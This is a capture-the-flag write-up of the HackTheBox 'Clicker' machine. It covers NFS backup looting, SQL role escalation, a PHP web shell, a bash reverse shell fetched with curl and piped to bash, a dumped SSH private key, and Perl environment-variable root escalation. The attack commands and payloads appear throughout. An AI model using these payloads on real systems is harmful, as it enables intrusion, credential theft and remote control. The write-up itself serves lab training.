---
render_with_liquid: false
title: HackTheBox Writeup  Clicker
date: 2023-10-24 09:46:26 +1400
tags: [hackthebox, nmap, linux]
---




# Recon
---

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Oct 24 09:46:26 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/htb/Clicker/results/clicker.htb/scans/_full_tcp_nmap.txt -oX /home/kali/htb/Clicker/results/clicker.htb/scans/xml/_full_tcp_nmap.xml clicker.htb
Nmap scan report for clicker.htb (10.129.52.192)
Host is up, received user-set (0.093s latency).
Scanned at 2023-10-24 09:46:26 CST for 738s
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBO8nDXVOrF/vxCNHYMVULY8wShEwVH5Hy3Bs9s9o/WCwsV52AV5K8pMvcQ9E7JzxrXkUOgIV4I+8hI0iNLGXTVY=
|   256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjDCjag/Rh72Z4zXCLADSXbGjSPTH8LtkbgATATvbzv
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Clicker - The Game
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34391/tcp   mountd
|   100005  1,2,3      40331/tcp6  mountd
|   100005  1,2,3      44341/udp   mountd
|   100005  1,2,3      57301/udp6  mountd
|   100021  1,3,4      33369/tcp6  nlockmgr
|   100021  1,3,4      41025/tcp   nlockmgr
|   100021  1,3,4      50657/udp   nlockmgr
|   100021  1,3,4      57565/udp6  nlockmgr
|   100024  1          36829/tcp   status
|   100024  1          40476/udp   status
|   100024  1          44099/tcp6  status
|   100024  1          56018/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)
34391/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
36829/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
41025/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
52203/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
58223/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/24%OT=22%CT=1%CU=35308%PV=Y%DS=2%DC=T%G=Y%TM=653724
OS:D4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=
OS:105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=2%ISR=10C%TI=Z%CI=Z
OS:%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O
OS:5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 10.907 days (since Fri Oct 13 12:13:07 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   103.15 ms 10.10.16.1
2   113.53 ms clicker.htb (10.129.52.192)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Oct 24 09:58:44 2023 -- 1 IP address (1 host up) scanned in 737.97 seconds
```


## 80 - HTTP : Clicker - The Game


### Info

```ruby
http://clicker.htb [200] [Clicker - The Game] [Apache/2.4.52 (Ubuntu)] [Apache HTTP Server:2.4.52,Bootstrap,PHP,Ubuntu] [1629be1fd6a169557babf944f8fa3408b60971d5]
```

![](/assets/obsidian/b6d1d352a7802c44ae4203e16df63827.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_80.txt -u http://clicker.htb
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ cat ferox_80.txt
200      GET       50l       98w      733c http://clicker.htb/assets/cover.css
200      GET      127l      319w     3343c http://clicker.htb/info.php
200      GET        7l     1966w   155758c http://clicker.htb/assets/css/bootstrap.min.css
200      GET      107l      277w     2984c http://clicker.htb/
301      GET        9l       28w      312c http://clicker.htb/exports => http://clicker.htb/exports/
```

# User Flag
---

## Enumeration


### NFS - Website backup

```bash


┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ sudo mkdir /mnt/backup

┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ sudo mount -t nfs clicker.htb:/mnt/backups /mnt/backup

┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ ls -latr /mnt/backup
total 2240
-rw-r--r-- 1 root   root    2284115 Sep  2 04:27 clicker.htb_backup.zip
drwxr-xr-x 2 nobody nogroup    4096 Sep  6 03:19 .
drwxr-xr-x 5 root   root       4096 Oct 25 03:28 ..

┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ cp /media/backup/clicker.htb_backup.zip .

┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ mkdir -p loot && cd loot

┌──(bravosec㉿fsociety)-[~/htb/Clicker/loot]
└─$ unzip ../clicker.htb_backup.zip
```

### Credential harvesting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker/loot]
└─$ /opt/sectools/harvesting/eviltree/eviltree.py -r . -k passw,db_,admin,account,user,token -v
```

![](/assets/obsidian/d046fc54906dcd154d917623c7f96f21.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker/loot/clicker.htb]
└─$ detect-secrets scan . --all-files
```

```json
...
  "results": {
    "db_utils.php": [
      {
        "type": "Secret Keyword",
        "filename": "db_utils.php",
        "hashed_secret": "3b6fc1ccc2a672606209ed63158e6f9b1cb88452",
        "is_verified": false,
        "line_number": 6
      }
    ],
    "diagnostic.php": [
      {
        "type": "Hex High Entropy String",
        "filename": "diagnostic.php",
        "hashed_secret": "d9de14bd7b0e67ae8f339443099e060b7647b47b",
        "is_verified": false,
        "line_number": 3
      },
      {
        "type": "Secret Keyword",
        "filename": "diagnostic.php",
        "hashed_secret": "3b6fc1ccc2a672606209ed63158e6f9b1cb88452",
        "is_verified": false,
        "line_number": 29
      }
    ]
  },
...
```


### Dynamic analyze

It records clicks and achieved levels of user to profile

![](/assets/obsidian/b29b0fafa4d037140e15b20d1b8646da.png)

![](/assets/obsidian/3de5b8624cd886966cfff5bffd03e2a3.png)

![](/assets/obsidian/df25564f5369c992fb60cef163bb178c.png)

Users can control the scores

![](/assets/obsidian/c30caebbf2a46861a686d489e5df83f1.png)

### Source code analyze

> `db_utils.php`

Suspect those DB creds are not real

![](/assets/obsidian/bd698eea8ee14a353e9a841a282e3b11.png)

Only `get_top_players()` function doesn't have prepare statement for SQL

But SQLI is not vulnerable for 2 places which referenced the function

![](/assets/obsidian/f9a851dfdf623c9ec313fa63f6411b48.png)

![](/assets/obsidian/e177e4c50da9963ff57b35002ed7c327.png)

- `$threshold` was locked

![](/assets/obsidian/9f435cd38832807906a82986ad777510.png)

- `$threshold` needs to be digits

![](/assets/obsidian/e56e73b39bd212c247933d5a5b648c6d.png)

> `diagnostic.php`

![](/assets/obsidian/14b05ac5d6614f9a8e3a7875dd97a68d.png)

It allows users to get data such as `environment`

![](/assets/obsidian/7a7b6f8a5e70bd013e1bdbd780eb4404.png)

Recovered the md5 hash and tried to get the data, but it didn't work

![](/assets/obsidian/a1774e032ae53271534abf07ee465026.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ curl 'http://clicker.htb/diagnostic.php?token=ac0e5a6a3a50b5639e69ae6d8cd49f40'
```

> `admin.php`

![](/assets/obsidian/1a6aab3c5a705b6338f9080ba5fc7717.png)


## Shell as www-data

### Get admin role

In order to exploit SQLI in `get_top_players()`, we need admin role

`save_game.php` have a flow which might be able to abuse

![](/assets/obsidian/209f82e2ced26e58d276cc23c7e7eb33.png)

> `save_profile()`

We can control update statement to set any columns for `player`, but no SQLI

![](/assets/obsidian/94c5edd146e20fb7412211d4ac6f14e1.png)

But I can update my role to `Admin`

To bypass `strtplower()` check, I can use closed comments which does nothing in SQL

`/*x*/`

Payload : `/save_game.php?clicks=0&level=0&/*x*/role=Admin` 

![](/assets/obsidian/e8e71128fab9c76253e79c4a41f4ba39.png)

Logout and login to re-fetch database, now I'm admin

![](/assets/obsidian/a42dd6a8cb98145ff8c57bddd7a9772b.png)

### Abuse admin functions - export

These pages are only available to admin

![](/assets/obsidian/32050618c4e632cfff0abf7eebcd1607.png)

`admin.php` only calls `get_top_players()` which we discovered invulnerable

`export.php` accepts content from user and saves to user controlled filename on local

![](/assets/obsidian/594ac7d56ec53eabcc06865e7e987082.png)

![](/assets/obsidian/05619bdabf2ab31966105e84571d7e2e.png)

Nickname have the type `string`, so replace my nickname to web shell code

```c
GET /save_game.php?clicks=999999999&level=999999999&nickname=<?=`$_GET[0]`;?>
```

![](/assets/obsidian/fbfb496c5d9f6e39288a67bfe4de79fc.png)

Save as txt to record request

![](/assets/obsidian/49547bfb7e39fc6a83057530f471e06b.png)

Save as php

![](/assets/obsidian/bb2c9bfd4ad0c3c698c390c2d948b385.png)

Web shell was success

![](/assets/obsidian/2ece752ccd0e7d17b3fbce0fac9e9cbd.png)

Get a reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ mkdir -p www&&cd www

┌──(bravosec㉿fsociety)-[~/htb/Clicker/www]
└─$ echo '/bin/bash -i >& /dev/tcp/10.10.16.24/1111 0>&1' > index.html

┌──(bravosec㉿fsociety)-[~/htb/Clicker/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ curl -X POST 'http://clicker.htb/exports/top_players_kjzxdpvc.php?0=curl+10.10.16.24|/bin/bash'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.24] from (UNKNOWN) [10.129.159.15] 52492
bash: cannot set terminal process group (1256): Inappropriate ioctl for device
bash: no job control in this shell
www-data@clicker:/var/www/clicker.htb/exports$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ts$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@clicker:/var/www/clicker.htb/exports$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

www-data@clicker:/var/www/clicker.htb/exports$ export TERM=xterm
www-data@clicker:/var/www/clicker.htb/exports$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## From www-data to jack


### SUID binary

```bash
www-data@clicker:/var/www/clicker.htb/exports$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
jack:x:1000:1000:jack:/home/jack:/bin/bash
```

```bash
www-data@clicker:/var/www/clicker.htb/exports$ find / -type f -perm -4000 -ls 2>/dev/null
    11792    228 -rwsr-xr-x   1 root     root       232416 Apr  3  2023 /usr/bin/sudo
      605     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
      729     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
      713     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /usr/bin/fusermount3
     1143     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
     1219     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
      874     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
      599     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
      908     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
      862     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
      330    332 -rwsr-xr-x   1 root     root       338536 Aug 24 13:40 /usr/lib/openssh/ssh-keysign
     1441     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13695     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
    39040    100 -rwsr-xr-x   1 root     root         101048 Oct 20  2022 /usr/sbin/mount.nfs
   171894     16 -rwsrwsr-x   1 jack     jack          16368 Feb 26  2023 /opt/manage/execute_query

www-data@clicker:/var/www/clicker.htb/exports$ file /opt/manage/execute_query
/opt/manage/execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped

www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query
ERROR: not enough arguments

www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 1
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
CREATE TABLE IF NOT EXISTS players(username varchar(255), nickname varchar(255), password varchar(255), role varchar(255), clicks bigint, level int, PRIMARY KEY (username))
--------------

--------------
INSERT INTO players (username, nickname, password, role, clicks, level)
        VALUES ('admin', 'admin', 'ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82', 'Admin', 999999999999999999, 999999999)
        ON DUPLICATE KEY UPDATE username=username
--------------
```

Download the binary

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ nc -lvnp 443 > execute_query
```

```bash
www-data@clicker:/var/www/clicker.htb/exports$ cat /opt/manage/execute_query>/dev/tcp/10.10.16.24/443
```

### Analyze with ghidra


#todo 

![](/assets/obsidian/e5f0b4671c0f72d2334c5fc26d7b17ff.png)

![](/assets/obsidian/8eac6f1dde3fe9f4eceb07a523f948dd.png)


### Read jack's ssh private key

```bash
www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 5 ../../../etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
' at line 1
```

```bash
www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 5 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ vi jack.id_rsa
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ ssh -i jack.id_rsa jack@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 25 05:42:32 PM UTC 2023

  System load:           0.0
  Usage of /:            53.4% of 5.77GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.129.159.15
  IPv6 address for eth0: dead:beef::250:56ff:feb9:34aa


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
jack@clicker:~$ cat user.txt
2f6363cb15813cc81a39910c30acfa47
```

# Root Flag
---

### SUDO - Perl environment variable arbitrary code execution

`jack` can start `/opt/monitor.sh` as root with specified `ENV` values

```bash
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

The script resets `PATH` so we can't do PATH injection, `/usr/bin/xml_pp` is the only binary that looks interesting

```bash
jack@clicker:~$ cat /opt/monitor.sh

#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

In case there's a background job that will parse the XML that might trigger XXE, check out diagnostic data

We can't control any variables

```bash
┌──(bravosec㉿fsociety)-[~/htb/Clicker]
└─$ curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token|xmllint -format -
<?xml version="1.0"?>
<data>
  <timestamp>1698314672</timestamp>
  <date>2023/10/26 10:04:32am</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392712</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1177</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:26773</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>66e01bbe4b3f406c9f8a6449a5fa714b</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```

Check out `/usr/bin/xml_pp`, it's a `perl` script

![](/assets/obsidian/e7bae895c1c73204ba6d963f107ba094.png)

Remember these two lines? Seems to be some sort of defensive measure

```bash
unset PERL5LIB;
unset PERLLIB;
```

Search `perl` in **0xsyr0**'s handbook section : `post_exploitation`

> https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/10_post_exploitation.md#environment-variable-arbitrary-code-execution

```bash
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/b&&chmod u+s /tmp/b");' /opt/monitor.sh
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.
jack@clicker:~$ /tmp/b -p
b-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
b-5.1# cat /root/root.txt
d4b9e2e5669e56ff97d7f05902dc765d
b-5.1#
```


# Additional
---
